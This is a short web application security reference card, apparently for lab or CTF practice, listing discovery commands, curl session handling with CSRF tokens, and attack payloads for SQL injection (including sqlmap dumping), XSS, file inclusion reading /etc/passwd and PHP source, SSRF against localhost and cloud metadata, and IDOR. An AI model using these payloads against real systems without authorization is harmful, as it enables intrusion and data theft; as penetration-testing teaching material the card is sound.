# Web AppSec — reference card

## Discovery

```bash
gobuster dir -u http://<ip>/ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<ip>/ -w <wl> -x php,txt,bak,old   # extensions matter
curl -s http://<ip>/robots.txt
whatweb http://<ip>/ ; nikto -h http://<ip>/
```

## Session auth via curl

```bash
# ONE jar for the whole session — -c writes, -b sends, reuse it everywhere.
# Hidden CSRF fields (user_token / csrf / _token) MUST ride in the POST —
# fetch the form, extract, submit:
tok=$(curl -s -c /tmp/jar 'http://<ip>/login.php' \
      | grep -oP "user_token' value='\K[^']+")
curl -s -c /tmp/jar -b /tmp/jar 'http://<ip>/login.php' \
     -d "username=admin&password=password&user_token=$tok&Login=Login"
curl -s -b /tmp/jar -o /dev/null -w '%{http_code} %{redirect_url}\n' \
     'http://<ip>/index.php'      # 302→login = failed, 200 = session live
```

## The classics

- **SQLi**: `'`, `' OR 1=1-- -`, `UNION SELECT` column counting, then
  `sqlmap -u 'http://<ip>/item?id=1' --batch --dump`
- **XSS**: `<script>alert(1)</script>` → stored vs reflected vs DOM
- **LFI**: sanity `../../../../etc/passwd` → empty page means MORE `../`
  (include() resolves relative to the vuln script's dir) or absolute
  `?page=/path/file` → `php://filter/convert.base64-encode/resource=index.php`
  reads PHP source
- **SSRF**: make the server fetch — `?url=http://127.0.0.1/`, `file:///etc/passwd`,
  cloud metadata `169.254.169.254`
- **IDOR/BOLA**: swap ids in requests; object-level authz is the common gap

## API testing

```bash
curl -s http://<ip>/api/v1/ | jq .          # enumerate verbs + versions
curl -X OPTIONS -i http://<ip>/api/users    # what's allowed
# hidden endpoints: fuzz /api/FUZZ and check OPTIONS/405 vs 404
```

## Worth remembering

- Status codes are signals: 401 vs 403 vs 404 tell different stories
- `file://` reads the local filesystem when a fetcher doesn't block it
- Rate limits + auth bypass chains: low-severity findings compose
